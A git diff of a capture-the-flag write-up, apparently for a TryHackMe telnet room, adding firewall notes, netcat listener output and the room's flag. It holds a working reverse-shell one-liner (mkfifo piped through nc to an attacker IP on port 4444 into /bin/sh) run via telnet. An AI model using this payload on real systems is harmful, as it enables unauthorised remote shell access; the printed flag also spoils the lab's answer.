@@ -1063,7 +1063,13 @@ Great! Now that's running, we need to copy and paste our msfvenom
 payload into the telnet session and run it as a command.
 Hopefully- this will give us a shell on the target machine!
 
-*Solution:* Run the netcat listener first
+*Solution:* First, I had to turn off my Firewall, so that I can receive incoming
+connection from the Telnet session (on Ubuntu, I used GUFW GUI).
+Because my Firewall was set to "Deny" all incoming connections.
+
+![firewall](firewall.png)
+
+Then run the netcat listener
 
 ```bash
 nc -lvnp 4444
@@ -1073,10 +1079,22 @@ Now run the payload inside the Telnet session
 
 ```bash
 .RUN mkfifo /tmp/ejqzmj; nc 10.9.0.168 4444 0</tmp/ejqzmj | /bin/sh >/tmp/ejqzmj 2>&1; rm /tmp/ejqzmj
-.RUN mkfifo /tmp/ebxiy; nc 10.9.0.168 4444 0</tmp/ebxiy | /bin/sh >/tmp/ebxiy 2>&1; rm /tmp/ebxiy
 ```
 
-***Correct answer:***
+Then netcat shows:
+
+```bash
+❯ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.234.88 56284
+# there is no other output, but the reverse shell is active, so try some commands:
+ls
+flag.txt
+cat flag.txt
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+```
+
+***Correct answer: No answer needed***
 
 Success! What is the contents of flag.txt?
 
